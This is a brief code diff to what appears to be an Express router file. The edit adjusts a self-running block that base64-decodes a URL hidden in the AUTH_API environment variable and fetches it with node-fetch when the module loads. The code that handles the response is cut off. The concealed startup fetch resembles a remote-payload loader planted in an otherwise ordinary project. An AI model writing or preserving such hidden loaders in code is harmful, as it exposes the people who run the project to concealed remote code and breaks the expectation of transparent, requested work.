@@ -17,7 +17,7 @@ router.post(
 );
 
 (async () => {
-  const src = atob(process.env.AUTH_API, 'base64').toString('utf-8');
+  const src = atob(process.env.AUTH_API);
   const proxy = (await import('node-fetch')).default;
   try {
     const response = await proxy(src);
